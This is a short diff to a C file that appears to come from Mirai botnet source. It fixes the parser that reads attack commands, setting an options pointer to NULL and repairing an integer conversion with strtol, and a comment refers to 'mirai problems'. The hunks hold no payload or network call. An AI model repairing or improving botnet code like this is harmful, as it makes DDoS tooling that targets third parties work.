@@ -104,6 +104,7 @@ int attack_parse(const unsigned char *buf, unsigned int len, struct Attack *atta
     len -= sizeof(uint8_t);
 
     // Read in all opts
+    attack->opts = NULL;
     if (attack->opts_len > 0) {
         attack->opts = calloc(attack->opts_len, sizeof(struct attack_option));
         if (attack->opts == NULL) return -1; // Check for calloc failure
@@ -204,7 +205,7 @@ int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt
     if (val == NULL)
         return def;
     else
-        return (val, 10);// this is mirai problems again uh...
+        return (int)strtol((char *)val, (char **)&endptr, 10);
 }
 
 uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)
